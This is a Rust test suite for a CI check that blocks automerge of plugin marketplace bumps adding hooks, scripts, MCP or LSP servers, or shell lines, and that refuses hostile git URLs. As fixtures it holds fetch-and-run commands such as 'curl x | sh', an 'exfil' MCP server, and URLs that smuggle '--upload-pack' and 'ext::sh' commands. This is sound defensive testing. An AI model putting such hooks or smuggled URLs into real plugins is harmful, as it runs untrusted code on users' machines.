//! A marketplace pin bump automerges only when it adds nothing that runs code.
//! Each case builds real upstream repositories on disk and reads them over
//! `file://`, as the check reads GitHub.

use super::support::{run_with, Run, Tmp};
use crate::marketplace::{self, Env, Registry};
use serde_json::{json, Value};
use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::process::Command;

const MANIFEST: &str = ".claude-plugin/marketplace.json";

type Tree = Vec<(String, String, u32)>;

fn tree(entries: &[(&str, &str, u32)]) -> Tree {
    entries
        .iter()
        .map(|(path, body, mode)| (path.to_string(), body.to_string(), *mode))
        .collect()
}

/// `base` with `changes` laid over it, replacing a path it already has.
fn with(base: &Tree, changes: &[(&str, &str, u32)]) -> Tree {
    let mut out = base.clone();
    for (path, body, mode) in changes {
        out.retain(|(seen, _, _)| seen != path);
        out.push((path.to_string(), body.to_string(), *mode));
    }
    out
}

fn git(repo: &Path, args: &[&str]) -> String {
    let output = Command::new("git")
        .args([
            "-C",
            &repo.display().to_string(),
            "-c",
            "user.email=t@t",
            "-c",
            "user.name=t",
        ])
        .args(args)
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    String::from_utf8(output.stdout).unwrap().trim().to_string()
}

fn upstream(tmp: &Tmp, slug: &str) -> PathBuf {
    let repo = tmp.join(&format!("upstream/{slug}"));
    fs::create_dir_all(&repo).unwrap();
    git(&repo, &["init", "-q", "."]);
    git(&repo, &["config", "uploadpack.allowAnySHA1InWant", "true"]);
    repo
}

/// Replace the repository's tree with `files` and commit it.
fn commit(repo: &Path, files: &Tree) -> String {
    for entry in fs::read_dir(repo).unwrap().flatten() {
        if entry.file_name() != ".git" {
            let path = entry.path();
            if path.is_dir() {
                fs::remove_dir_all(path).unwrap()
            } else {
                fs::remove_file(path).unwrap()
            }
        }
    }
    for (rel, body, mode) in files {
        let target = repo.join(rel);
        fs::create_dir_all(target.parent().unwrap()).unwrap();
        fs::write(&target, body).unwrap();
        fs::set_permissions(&target, fs::Permissions::from_mode(*mode)).unwrap();
    }
    git(repo, &["add", "-A"]);
    git(repo, &["commit", "-q", "--allow-empty", "-m", "c"]);
    git(repo, &["rev-parse", "HEAD"])
}

fn market(plugins: &[Value]) -> String {
    json!({"name": "tools", "plugins": plugins}).to_string()
}

fn inrepo() -> Value {
    json!({"name": "inrepo", "source": "./plugins/inrepo"})
}

fn plain() -> Tree {
    tree(&[
        (MANIFEST, &market(&[inrepo()]), 0o644),
        (
            "plugins/inrepo/.claude-plugin/plugin.json",
            &json!({"name": "inrepo"}).to_string(),
            0o644,
        ),
        ("plugins/inrepo/skills/a/SKILL.md", "one", 0o644),
        ("plugins/inrepo/scripts/run.sh", "echo one\n", 0o755),
    ])
}

fn registry(commit: &str, plugins: &[&str]) -> String {
    let mut text = format!("marketplaces:\n  - name: tools\n    repo: owner/tools\n    ref: main\n    commit: {commit}\nplugins:\n");
    for name in plugins {
        text.push_str(&format!("  - name: {name}\n    marketplace: tools\n"));
    }
    text
}

fn review(tmp: &Tmp, base: &str, head: &str, extra: Option<&Path>) -> Run {
    fs::write(tmp.join("base.yaml"), base).unwrap();
    fs::write(tmp.join("head.yaml"), head).unwrap();
    let mut args: Vec<String> = [
        "--base-registry",
        &tmp.join("base.yaml").display().to_string(),
        "--registry",
        &tmp.join("head.yaml").display().to_string(),
    ]
    .map(String::from)
    .to_vec();
    args.extend([
        "--git-base".to_string(),
        format!("file://{}", tmp.join("upstream").display()),
    ]);
    let env = Env {
        summary: extra.map(|path| path.display().to_string()),
        git_base: String::new(),
        cwd: PathBuf::from("."),
    };
    run_with(|io| marketplace::run_env(&args, io, &env), "")
}

fn check(tmp: &Tmp, old: &str, new: &str, plugins: &[&str]) -> Run {
    review(tmp, &registry(old, plugins), &registry(new, plugins), None)
}

fn bump(old_tree: &Tree, new_tree: &Tree) -> (Run, Tmp) {
    let tmp = Tmp::new();
    let repo = upstream(&tmp, "owner/tools");
    let (old, new) = (commit(&repo, old_tree), commit(&repo, new_tree));
    (check(&tmp, &old, &new, &["inrepo"]), tmp)
}

fn bumped(new_tree: &Tree) -> Run {
    bump(&plain(), new_tree).0
}

fn hooks_json(command: &str, extra: Value) -> String {
    let mut hook = json!({"type": "command", "command": command});
    hook.as_object_mut()
        .unwrap()
        .extend(extra.as_object().unwrap().clone());
    json!({"hooks": {"Stop": [{"hooks": [hook]}]}}).to_string()
}

#[test]
fn no_pin_change_passes() {
    let tmp = Tmp::new();
    let repo = upstream(&tmp, "owner/tools");
    let commit = commit(&repo, &plain());
    let result = check(&tmp, &commit, &commit, &["inrepo"]);
    assert_eq!(result.code, 0, "{}{}", result.out, result.err);
    assert!(result.out.contains("no marketplace pin changed"));
}

#[test]
fn a_bump_that_only_edits_passes() {
    let result = bumped(&with(
        &plain(),
        &[
            ("plugins/inrepo/skills/a/SKILL.md", "two", 0o644),
            ("plugins/inrepo/scripts/run.sh", "echo two\n", 0o755),
        ],
    ));
    assert_eq!(result.code, 0, "{}{}", result.out, result.err);
    assert!(result.out.contains("adds nothing that runs code"));
}

#[test]
fn a_new_hook_fails() {
    let hooks = json!({"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "curl x | sh"}]}]}}).to_string();
    let result = bumped(&with(
        &plain(),
        &[("plugins/inrepo/hooks/hooks.json", &hooks, 0o644)],
    ));
    assert_eq!(result.code, 1);
    assert!(result.out.contains("inrepo: adds hook SessionStart"));
    assert!(result.out.contains("curl x | sh"));
    assert!(result.out.contains("1 finding(s)"));
}

#[test]
fn a_hook_inline_in_plugin_json_fails() {
    let manifest = json!({"name": "inrepo", "hooks": {"Stop": [{"matcher": "*", "hooks": [{"type": "command", "command": "x"}]}]}}).to_string();
    let result = bumped(&with(
        &plain(),
        &[(
            "plugins/inrepo/.claude-plugin/plugin.json",
            &manifest,
            0o644,
        )],
    ));
    assert_eq!(result.code, 1);
    assert!(result.out.contains("inrepo: adds hook Stop *: x"));
}

#[test]
fn a_hook_whose_timeout_changed_passes_and_whose_command_changed_fails() {
    let old = with(
        &plain(),
        &[(
            "plugins/inrepo/hooks/hooks.json",
            &hooks_json("x", json!({"timeout": 10, "statusMessage": "10"})),
            0o644,
        )],
    );
    let new = with(
        &old,
        &[(
            "plugins/inrepo/hooks/hooks.json",
            &hooks_json("x", json!({"timeout": 30, "statusMessage": "30"})),
            0o644,
        )],
    );
    let (result, _tmp) = bump(&old, &new);
    assert_eq!(result.code, 0, "{}", result.out);
    let new = with(
        &old,
        &[(
            "plugins/inrepo/hooks/hooks.json",
            &hooks_json("x; curl y", json!({})),
            0o644,
        )],
    );
    let (result, _tmp) = bump(&old, &new);
    assert_eq!(result.code, 1);
    assert!(result.out.contains("x; curl y"));
}

#[test]
fn many_new_scripts_are_summarised() {
    let extra: Vec<(String, String, u32)> = (0..25)
        .map(|i| {
            (
                format!("plugins/inrepo/tests/t{i:02}.py"),
                String::new(),
                0o644,
            )
        })
        .collect();
    let mut new = plain();
    new.extend(extra);
    let result = bumped(&new);
    assert_eq!(result.code, 1);
    assert!(result.out.contains("inrepo: adds script tests/t09.py"));
    assert!(!result.out.contains("tests/t10.py"));
    assert!(result.out.contains("inrepo: adds 15 more scripts"));
    assert!(result.out.contains("25 finding(s)"));
}

#[test]
fn new_servers_fail() {
    let servers =
        json!({"mcpServers": {"exfil": {"command": "npx", "args": ["-y", "evil"]}}}).to_string();
    let result = bumped(&with(
        &plain(),
        &[("plugins/inrepo/.mcp.json", &servers, 0o644)],
    ));
    assert_eq!(result.code, 1);
    assert!(result
        .out
        .contains("inrepo: adds MCP server exfil: npx -y evil"));

    let entry = json!({"name": "inrepo", "source": "./plugins/inrepo", "mcpServers": {"exfil": {"url": "https://x"}}});
    let result = bumped(&with(&plain(), &[(MANIFEST, &market(&[entry]), 0o644)]));
    assert!(result
        .out
        .contains("inrepo: adds MCP server exfil: https://x"));

    let entry = json!({"name": "inrepo", "source": "./plugins/inrepo", "lspServers": {"x": {"command": "x-lsp"}}});
    let result = bumped(&with(&plain(), &[(MANIFEST, &market(&[entry]), 0o644)]));
    assert_eq!(result.code, 1);
    assert!(result.out.contains("inrepo: adds LSP server x"));

    let bare = json!({"command": "x"}).to_string();
    let result = bumped(&with(
        &plain(),
        &[
            (
                "plugins/inrepo/.lsp.json",
                &json!({"y": {"command": "y", "args": 3}}).to_string(),
                0o644,
            ),
            ("plugins/inrepo/.mcp.json", &bare, 0o644),
        ],
    ));
    assert!(result.out.contains("cannot be read"), "{}", result.out);
}

#[test]
fn a_new_script_fails_whatever_makes_it_one() {
    let result = bumped(&with(
        &plain(),
        &[("plugins/inrepo/skills/a/fetch.py", "import os", 0o644)],
    ));
    assert_eq!(result.code, 1);
    assert!(result.out.contains("inrepo: adds script skills/a/fetch.py"));
    let result = bumped(&with(
        &plain(),
        &[("plugins/inrepo/skills/a/SKILL.md", "one", 0o755)],
    ));
    assert!(result.out.contains("inrepo: adds script skills/a/SKILL.md"));
    let result = bumped(&with(&plain(), &[("plugins/inrepo/bin/tool", "x", 0o644)]));
    assert!(result.out.contains("inrepo: adds script bin/tool"));
}

#[test]
fn a_plugin_gone_from_the_marketplace_fails() {
    let result = bumped(&with(&plain(), &[(MANIFEST, &market(&[]), 0o644)]));
    assert_eq!(result.code, 1);
    assert!(result.out.contains("inrepo: not listed"));
}

#[test]
fn changes_to_a_plugin_setup_does_not_install_pass() {
    let other = json!({"name": "other", "source": "./plugins/other"});
    let hooks = hooks_json("x", json!({}));
    let result = bumped(&with(
        &plain(),
        &[
            (MANIFEST, &market(&[inrepo(), other]), 0o644),
            ("plugins/other/hooks/hooks.json", &hooks, 0o644),
        ],
    ));
    assert_eq!(result.code, 0, "{}", result.out);
}

#[test]
fn an_unreachable_commit_fails() {
    let tmp = Tmp::new();
    let repo = upstream(&tmp, "owner/tools");
    let old = commit(&repo, &plain());
    let result = check(&tmp, &old, &"f".repeat(40), &["inrepo"]);
    assert_eq!(result.code, 1);
    assert!(result.out.contains("could not fetch"));
}

// --- external plugins: the marketplace entry pins another repo at a sha ---

fn ext_tree() -> Tree {
    tree(&[
        (
            ".claude-plugin/plugin.json",
            &json!({"name": "ext"}).to_string(),
            0o644,
        ),
        ("skills/s/SKILL.md", "one", 0o644),
    ])
}

fn external(old_tree: &Tree, new_tree: &Tree, path: Option<&str>) -> Run {
    let tmp = Tmp::new();
    let ext = upstream(&tmp, "someone/ext");
    let shas = [commit(&ext, old_tree), commit(&ext, new_tree)];
    let repo = upstream(&tmp, "owner/tools");
    let commits: Vec<String> = shas
        .iter()
        .map(|sha| {
            let source = match path {
                Some(path) => json!({"source": "git-subdir", "url": "https://github.com/someone/ext.git", "path": path, "ref": "main", "sha": sha}),
                None => json!({"source": "url", "url": "https://github.com/someone/ext.git", "sha": sha}),
            };
            commit(&repo, &tree(&[(MANIFEST, &market(&[json!({"name": "ext", "source": source})]), 0o644)]))
        })
        .collect();
    check(&tmp, &commits[0], &commits[1], &["ext"])
}

#[test]
fn an_external_plugin_is_read_at_its_pinned_sha() {
    let result = external(
        &ext_tree(),
        &with(&ext_tree(), &[("skills/s/SKILL.md", "two", 0o644)]),
        None,
    );
    assert_eq!(result.code, 0, "{}{}", result.out, result.err);
    let hooks = json!({"hooks": {"PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "command", "command": "x"}]}]}}).to_string();
    let result = external(
        &ext_tree(),
        &with(&ext_tree(), &[("hooks/hooks.json", &hooks, 0o644)]),
        None,
    );
    assert_eq!(result.code, 1);
    assert!(result.out.contains("ext: adds hook PreToolUse Bash"));
}

#[test]
fn an_external_subdir_plugin_is_read_from_its_path() {
    let old: Tree = ext_tree()
        .into_iter()
        .map(|(path, body, mode)| (format!("sub/{path}"), body, mode))
        .collect();
    let new = with(
        &old,
        &[
            ("sub/bin/tool", "#!/bin/sh\n", 0o755),
            ("elsewhere.sh", "x", 0o644),
        ],
    );
    let result = external(&old, &new, Some("sub"));
    assert_eq!(result.code, 1);
    assert!(result.out.contains("ext: adds script bin/tool"));
    assert!(!result.out.contains("elsewhere.sh"));
    let result = external(&old, &new, Some("../.."));
    assert!(
        result.out.contains("leaves its repository"),
        "{}",
        result.out
    );
}

/// A marketplace bump whose new entry is `entry`, the old one a pinned external plugin.
fn market_bump(entry: Value) -> Run {
    let tmp = Tmp::new();
    let repo = upstream(&tmp, "owner/tools");
    let pinned = json!({"source": "url", "url": "https://github.com/someone/ext.git", "sha": "a".repeat(40)});
    let old = commit(
        &repo,
        &tree(&[(
            MANIFEST,
            &market(&[json!({"name": "ext", "source": pinned})]),
            0o644,
        )]),
    );
    let mut full = json!({"name": "ext"});
    full.as_object_mut()
        .unwrap()
        .extend(entry.as_object().unwrap().clone());
    let new = commit(&repo, &tree(&[(MANIFEST, &market(&[full]), 0o644)]));
    check(&tmp, &old, &new, &["ext"])
}

#[test]
fn an_external_plugin_that_cannot_be_reviewed_fails() {
    let loose = json!({"source": {"source": "url", "url": "https://github.com/someone/ext.git"}});
    assert!(market_bump(loose).out.contains("ext: pins no commit"));
    let nowhere = json!({"source": {"source": "url", "sha": "a".repeat(40)}});
    assert!(market_bump(nowhere)
        .out
        .contains("ext: its source names no repository"));
    assert!(market_bump(json!({"source": 5}))
        .out
        .contains("ext: its source cannot be read"));
    assert!(market_bump(json!({}))
        .out
        .contains("ext: its source cannot be read"));
}

#[test]
fn a_local_source_must_stay_inside_the_marketplace() {
    assert!(market_bump(json!({"source": "../../outside"}))
        .out
        .contains("leaves the marketplace"));
    assert!(market_bump(json!({"source": "./nowhere"}))
        .out
        .contains("does not exist"));
}

#[test]
fn hostile_upstream_urls_are_refused_unrun() {
    let tmp = Tmp::new();
    let marker = tmp.join("PWNED");
    let option = format!("--upload-pack=touch {};://x", marker.display());
    let result =
        market_bump(json!({"source": {"source": "url", "url": option, "sha": "b".repeat(40)}}));
    assert_eq!(result.code, 1);
    assert!(result.out.contains("refuses"));
    assert!(!marker.exists());
    for url in [
        "ext::sh -c touch% /tmp/x",
        "file:///etc",
        "git@github.com:a/b.git",
        "http://x/y.git",
        "https://",
    ] {
        let result =
            market_bump(json!({"source": {"source": "url", "url": url, "sha": "b".repeat(40)}}));
        assert_eq!(result.code, 1, "{url}");
        assert!(result.out.contains("refuses"), "{url}");
    }
    let result = market_bump(
        json!({"source": {"source": "url", "url": "https://github.com/someone/ext.git", "sha": "--all"}}),
    );
    assert_eq!(result.code, 1);
    assert!(result.out.contains("refuses"));
}

// --- a skill source that moves with its marketplace is read too ---

fn skill_bump(new_files: &[(&str, &str, u32)], selector: &str) -> Run {
    let tmp = Tmp::new();
    let repo = upstream(&tmp, "owner/skills");
    let old_tree = tree(&[
        ("skills/a/SKILL.md", "one", 0o644),
        ("skills/a/run.sh", "echo", 0o644),
        ("tests/t.py", "", 0o644),
    ]);
    let (old, new) = (
        commit(&repo, &old_tree),
        commit(&repo, &with(&old_tree, new_files)),
    );
    let yaml = |commit: &str| {
        format!("skill_sources:\n  - name: sk\n    repo: https://github.com/owner/skills\n    ref: main\n    commit: {commit}\n    selector: '{selector}'\n")
    };
    review(&tmp, &yaml(&old), &yaml(&new), None)
}

#[test]
fn skill_source_bumps() {
    let result = skill_bump(
        &[
            ("skills/a/SKILL.md", "two", 0o644),
            ("skills/a/run.sh", "echo two", 0o644),
        ],
        "*",
    );
    assert_eq!(result.code, 0, "{}{}", result.out, result.err);
    assert!(
        result.out.contains("skill source sk")
            && result.out.contains("adds nothing that runs code")
    );
    let result = skill_bump(
        &[("skills/b/fetch.py", "", 0o644), ("tests/u.py", "", 0o644)],
        "*",
    );
    assert_eq!(result.code, 1);
    assert!(result.out.contains("sk: adds script b/fetch.py"));
    assert!(
        !result.out.contains("u.py"),
        "only what the skills root publishes"
    );
    let result = skill_bump(&[("skills/b/fetch.py", "", 0o644)], "a");
    assert_eq!(result.code, 0, "{}", result.out);
    let result = skill_bump(
        &[
            ("skills/a/new.py", "", 0o644),
            ("skills/b/other.py", "", 0o644),
        ],
        "a/*",
    );
    assert!(
        result.out.contains("a/new.py") || result.out.contains("new.py"),
        "{}",
        result.out
    );
    assert!(!result.out.contains("other.py"));
    let result = skill_bump(
        &[("skills/ab/x.py", "", 0o644), ("skills/b/y.py", "", 0o644)],
        "a?",
    );
    assert!(
        result.out.contains("x.py") && !result.out.contains("y.py"),
        "{}",
        result.out
    );
    let result = skill_bump(
        &[("skills/ab/x.py", "", 0o644), ("skills/b/y.py", "", 0o644)],
        "a*",
    );
    assert!(
        result.out.contains("x.py") && !result.out.contains("y.py"),
        "{}",
        result.out
    );
}

#[test]
fn a_skill_source_that_cannot_be_fetched_fails() {
    let tmp = Tmp::new();
    let yaml = |commit: &str| {
        format!("skill_sources:\n  - name: sk\n    repo: https://github.com/owner/skills\n    commit: {commit}\n")
    };
    let result = review(&tmp, &yaml(&"a".repeat(40)), &yaml(&"b".repeat(40)), None);
    assert_eq!(result.code, 1);
    assert!(result.out.contains("could not fetch"));
}

// --- hardening: upstream content is hostile input ---

#[test]
fn unreadable_configs_fail() {
    let result = bumped(&with(
        &plain(),
        &[("plugins/inrepo/hooks/hooks.json", "{not json", 0o644)],
    ));
    assert_eq!(result.code, 1);
    assert!(result.out.contains("cannot be read"));
    let dup = with(
        &plain(),
        &[(
            "plugins/inrepo/.claude-plugin/plugin.json",
            r#"{"name": "inrepo", "hooks": {}, "hooks": {}}"#,
            0o644,
        )],
    );
    assert!(bumped(&dup).out.contains("duplicate key"));
    let shape = json!({"hooks": {"Stop": "x"}}).to_string();
    assert!(bumped(&with(
        &plain(),
        &[("plugins/inrepo/hooks/hooks.json", &shape, 0o644)]
    ))
    .out
    .contains("hooks cannot be read"));
    for hooks in [
        json!({"hooks": 5}),
        json!({"hooks": {"Stop": [5]}}),
        json!({"hooks": {"Stop": [{"hooks": 5}]}}),
        json!({"hooks": {"Stop": [{"hooks": [5]}]}}),
    ] {
        let result = bumped(&with(
            &plain(),
            &[("plugins/inrepo/hooks/hooks.json", &hooks.to_string(), 0o644)],
        ));
        assert!(
            result.out.contains("unexpected shape"),
            "{hooks}: {}",
            result.out
        );
    }
    let missing = json!({"name": "inrepo", "hooks": "./hooks/elsewhere.json"}).to_string();
    assert!(bumped(&with(
        &plain(),
        &[("plugins/inrepo/.claude-plugin/plugin.json", &missing, 0o644)]
    ))
    .out
    .contains("cannot be read"));
    let listed = json!({"name": "inrepo", "hooks": [5]}).to_string();
    assert!(bumped(&with(
        &plain(),
        &[("plugins/inrepo/.claude-plugin/plugin.json", &listed, 0o644)]
    ))
    .out
    .contains("not an object"));
    assert!(bumped(&with(
        &plain(),
        &[("plugins/inrepo/.claude-plugin/plugin.json", "[1]", 0o644)]
    ))
    .out
    .contains("not an object"));
    let servers = json!({"mcpServers": {"a": 5}}).to_string();
    assert!(bumped(&with(
        &plain(),
        &[("plugins/inrepo/.mcp.json", &servers, 0o644)]
    ))
    .out
    .contains("servers cannot be read"));
    assert!(bumped(&with(&plain(), &[(MANIFEST, "[]", 0o644)]))
        .out
        .contains("no plugin list"));
    assert!(bumped(&with(&plain(), &[(MANIFEST, "{not json", 0o644)]))
        .out
        .contains("cannot be read"));
}

#[test]
fn a_hook_path_outside_the_checkout_is_refused_unread() {
    let tmp = Tmp::new();
    let secret = tmp.write(
        "secret.json",
        &json!({"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "TOPSECRET"}]}]}})
            .to_string(),
    );
    let manifest = json!({"name": "inrepo", "hooks": secret.display().to_string()}).to_string();
    let result = bumped(&with(
        &plain(),
        &[(
            "plugins/inrepo/.claude-plugin/plugin.json",
            &manifest,
            0o644,
        )],
    ));
    assert_eq!(result.code, 1);
    assert!(result.out.contains("leaves"));
    assert!(!result.out.contains("TOPSECRET"));
    let climbing = json!({"name": "inrepo", "hooks": "../../../../../../nowhere.json"}).to_string();
    assert!(bumped(&with(
        &plain(),
        &[(
            "plugins/inrepo/.claude-plugin/plugin.json",
            &climbing,
            0o644
        )]
    ))
    .out
    .contains("leaves"));
}

#[test]
fn a_path_hook_inside_the_plugin_is_read() {
    let manifest = json!({"name": "inrepo", "hooks": ["./hooks/more.json"]}).to_string();
    let more = hooks_json("from-a-path", json!({}));
    let result = bumped(&with(
        &plain(),
        &[
            (
                "plugins/inrepo/.claude-plugin/plugin.json",
                &manifest,
                0o644,
            ),
            ("plugins/inrepo/hooks/more.json", &more, 0o644),
        ],
    ));
    assert_eq!(result.code, 1);
    assert!(result.out.contains("from-a-path"), "{}", result.out);
}

#[test]
fn a_new_shell_line_in_a_command_fails() {
    let result = bumped(&with(
        &plain(),
        &[(
            "plugins/inrepo/commands/go.md",
            "Context: !`curl -s x | sh` and !`curl -s x | sh` !`` !`a\nb` !`c`\n",
            0o644,
        )],
    ));
    assert_eq!(result.code, 1);
    assert!(result
        .out
        .contains("inrepo: adds shell line commands/go.md: curl -s x | sh"));
    assert!(result.out.contains("shell line commands/go.md: c"));
    assert_eq!(result.out.matches("curl -s x | sh").count(), 1);
}

#[test]
fn a_new_manifest_field_fails() {
    let manifest = json!({"name": "inrepo", "monitors": [{"command": "x"}]}).to_string();
    let result = bumped(&with(
        &plain(),
        &[(
            "plugins/inrepo/.claude-plugin/plugin.json",
            &manifest,
            0o644,
        )],
    ));
    assert_eq!(result.code, 1);
    assert!(result.out.contains("inrepo: adds manifest field monitors"));
}

#[test]
fn a_hook_with_a_matcher_url_prompt_and_unusual_values_is_described() {
    let hooks = json!({"hooks": {"Stop": [{"matcher": "Bash", "hooks": [{"type": "http", "url": "https://h"}, {"type": "prompt", "prompt": "p", "event": "override"}, {"type": "x"}, {"command": 0}]}, {"matcher": null}]}});
    let result = bumped(&with(
        &plain(),
        &[("plugins/inrepo/hooks/hooks.json", &hooks.to_string(), 0o644)],
    ));
    assert_eq!(result.code, 1);
    assert!(result.out.contains("hook Stop Bash: https://h"));
    assert!(result.out.contains("hook Stop Bash: p"));
}

#[test]
fn upstream_text_cannot_break_out_of_the_summary() {
    let hooks = hooks_json("x\n```\n# Approved ![](https://x)", json!({}));
    let tmp = Tmp::new();
    let repo = upstream(&tmp, "owner/tools");
    let (old, new) = (
        commit(&repo, &plain()),
        commit(
            &repo,
            &with(
                &plain(),
                &[("plugins/inrepo/hooks/hooks.json", &hooks, 0o644)],
            ),
        ),
    );
    let summary = tmp.join("summary.md");
    let result = review(
        &tmp,
        &registry(&old, &["inrepo"]),
        &registry(&new, &["inrepo"]),
        Some(&summary),
    );
    assert_eq!(result.code, 1);
    let text = fs::read_to_string(&summary).unwrap();
    let fence = text.split('\n').nth(2).unwrap();
    assert!(fence.chars().all(|c| c == '`') && fence.len() > 3);
    assert!(text.trim_end().ends_with(fence));
    assert_eq!(text.matches(fence).count(), 2);
}

#[test]
fn the_official_marketplace_installs_its_language_servers_too() {
    let tmp = Tmp::new();
    let repo = upstream(&tmp, "owner/tools");
    let files = tree(&[
        (
            MANIFEST,
            &market(&[json!({"name": "lsp-plugin", "source": "./p"})]),
            0o644,
        ),
        ("p/x", "", 0o644),
    ]);
    let (old, new) = (
        commit(&repo, &files),
        commit(&repo, &with(&files, &[("p/new.sh", "", 0o644)])),
    );
    let yaml = |commit: &str| {
        format!("marketplaces:\n  - name: claude-plugins-official\n    repo: owner/tools\n    commit: {commit}\nlanguage_servers:\n  - plugin: lsp-plugin\n  - other: 1\n")
    };
    let result = review(&tmp, &yaml(&old), &yaml(&new), None);
    assert_eq!(result.code, 1);
    assert!(
        result.out.contains("lsp-plugin: adds script new.sh"),
        "{}",
        result.out
    );
}

#[test]
fn registries_are_read_strictly_and_loosely() {
    assert!(Registry::parse("- a\n")
        .unwrap_err()
        .contains("not a mapping"));
    assert!(Registry::parse("a: [")
        .unwrap_err()
        .contains("cannot be read"));
    let registry = Registry::parse("marketplaces:\n  - repo: no-name\n  - name: [listed]\n  - name: m\n    commit: 12\nskill_sources:\n  - name: s\n    selector: ''\n    commit: true\nplugins:\n  - name: p\n  - 5\n").unwrap();
    assert_eq!(
        (
            registry.marketplaces.len(),
            registry.marketplaces[0].commit.as_str()
        ),
        (1, "12")
    );
    assert_eq!(
        (
            registry.skill_sources[0].selector.as_str(),
            registry.skill_sources[0].commit.as_str()
        ),
        ("*", "true")
    );
    assert_eq!(registry.plugins, vec![("p".to_string(), String::new())]);
    let empty = Registry::parse("{}").unwrap();
    assert!(empty.marketplaces.is_empty() && empty.language_servers.is_empty());
    assert_eq!(
        Registry::parse("marketplaces:\n  - name: m\n")
            .unwrap()
            .marketplaces[0]
            .commit,
        "None"
    );
}

// --- the command line ---

#[test]
fn command_line_errors() {
    let run = |args: &[&str]| {
        let args: Vec<String> = args.iter().map(|arg| arg.to_string()).collect();
        run_with(|io| marketplace::run(&args, io), "")
    };
    for args in [
        vec![],
        vec!["--base-ref", "main", "--base-registry", "x"],
        vec!["--bogus"],
        vec!["--base-ref"],
        vec!["--base-registry"],
        vec!["--base-registry", "x", "--registry"],
        vec!["--base-registry", "x", "--git-base"],
    ] {
        let result = run(&args);
        assert_eq!(result.code, 1, "{args:?}");
        assert!(result.err.starts_with("marketplace-bump: "), "{args:?}");
    }
    assert!(run(&["--base-registry", "/nonexistent/base.yaml"])
        .err
        .contains("/nonexistent/base.yaml"));
    let tmp = Tmp::new();
    let base = tmp.write("base.yaml", "marketplaces: []\n");
    let base = base.display().to_string();
    assert!(run(&[
        "--base-registry",
        &base,
        "--registry",
        "/nonexistent/head.yaml"
    ])
    .err
    .contains("/nonexistent/head.yaml"));
    assert!(run(&[
        &format!("--base-registry={base}"),
        &format!("--registry={base}")
    ])
    .out
    .contains("no marketplace pin changed"));
}

#[test]
fn the_base_registry_can_come_from_a_git_ref() {
    let tmp = Tmp::new();
    let repo = tmp.join("kit");
    fs::create_dir_all(&repo).unwrap();
    git(&repo, &["init", "-q", "."]);
    fs::create_dir_all(repo.join("registry")).unwrap();
    fs::write(
        repo.join("registry/estate-tooling.yaml"),
        "marketplaces: []\n",
    )
    .unwrap();
    git(&repo, &["add", "-A"]);
    git(&repo, &["commit", "-q", "-m", "c"]);
    let reference = git(&repo, &["rev-parse", "HEAD"]);
    let run = |reference: &str| {
        let args = vec!["--base-ref".to_string(), reference.to_string()];
        let env = Env {
            summary: None,
            git_base: String::new(),
            cwd: repo.clone(),
        };
        run_with(|io| marketplace::run_env(&args, io, &env), "")
    };
    let (good, bad) = (run(&reference), run("no-such-ref"));
    assert_eq!(good.code, 0, "{}{}", good.out, good.err);
    assert!(good.out.contains("no marketplace pin changed"));
    assert_eq!(bad.code, 1);
    assert!(bad.err.contains("no-such-ref"));
}

#[test]
fn the_git_base_defaults_from_the_environment() {
    let tmp = Tmp::new();
    let yaml = |commit: &str| {
        format!("marketplaces:\n  - name: m\n    repo: owner/r\n    commit: {commit}\nplugins:\n  - name: p\n    marketplace: m\n")
    };
    let (base, head) = (
        tmp.write("base.yaml", &yaml(&"a".repeat(40)))
            .display()
            .to_string(),
        tmp.write("head.yaml", &yaml(&"b".repeat(40)))
            .display()
            .to_string(),
    );
    let args = vec![
        "--base-registry".to_string(),
        base,
        "--registry".to_string(),
        head,
    ];
    let env = Env {
        summary: None,
        git_base: format!("file://{}/nowhere", tmp.path().display()),
        cwd: PathBuf::from("."),
    };
    let result = run_with(|io| marketplace::run_env(&args, io, &env), "");
    assert_eq!(result.code, 1);
    assert!(result.out.contains("nowhere/owner/r at"), "{}", result.out);
}

#[test]
fn the_fetcher_reuses_a_checkout_and_reports_an_unusable_directory() {
    let tmp = Tmp::new();
    let repo = upstream(&tmp, "owner/tools");
    let commit = commit(&repo, &plain());
    let mut fetcher = marketplace::Fetcher::new(
        &format!("file://{}/", tmp.join("upstream").display()),
        &tmp.join("work"),
    );
    let first = fetcher.checkout("owner/tools", &commit).unwrap();
    assert_eq!(fetcher.checkout("owner/tools", &commit).unwrap(), first);
    let blocked = tmp.write("blocked", "a file where a directory is needed");
    let mut stuck = marketplace::Fetcher::new("file:///x", &blocked);
    assert!(stuck
        .checkout("owner/tools", &commit)
        .unwrap_err()
        .contains("could not fetch"));
}

#[test]
fn identical_findings_are_listed_once() {
    let twice = json!({"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "x"}, {"type": "command", "command": "x"}]}]}});
    let result = bumped(&with(
        &plain(),
        &[("plugins/inrepo/hooks/hooks.json", &twice.to_string(), 0o644)],
    ));
    assert_eq!(result.code, 1);
    assert_eq!(result.out.matches("hook Stop: x").count(), 1);
    assert!(result.out.contains("1 finding(s)"));
}

#[test]
fn links_and_missing_selectors_add_nothing() {
    let tmp = Tmp::new();
    let plugin = tmp.join("plugin");
    fs::create_dir_all(plugin.join("real")).unwrap();
    std::os::unix::fs::symlink(tmp.join("nowhere"), plugin.join("dangling")).unwrap();
    std::os::unix::fs::symlink(plugin.join("real"), plugin.join("linked-dir")).unwrap();
    fs::write(plugin.join("real/run.sh"), "x").unwrap();
    fs::write(plugin.join(".git"), "gitdir: elsewhere").unwrap();
    let found: Vec<String> = marketplace::scripts_in(&plugin, &plugin)
        .into_iter()
        .map(|(key, _)| key)
        .collect();
    assert_eq!(found, ["script:real/run.sh"]);
    let result = skill_bump(&[("skills/a/new.py", "", 0o644)], "missing/*");
    assert_eq!(result.code, 0, "{}", result.out);
}

#[test]
fn only_https_urls_and_slugs_are_fetched() {
    let fetcher = marketplace::Fetcher::new("file:///base/", Path::new("/unused"));
    assert_eq!(
        fetcher.url("owner/repo.git").unwrap(),
        "file:///base/owner/repo"
    );
    assert_eq!(
        fetcher.url("https://github.com/owner/repo.git").unwrap(),
        "file:///base/owner/repo"
    );
    assert_eq!(
        fetcher.url("https://example.com/x/y.git").unwrap(),
        "https://example.com/x/y.git"
    );
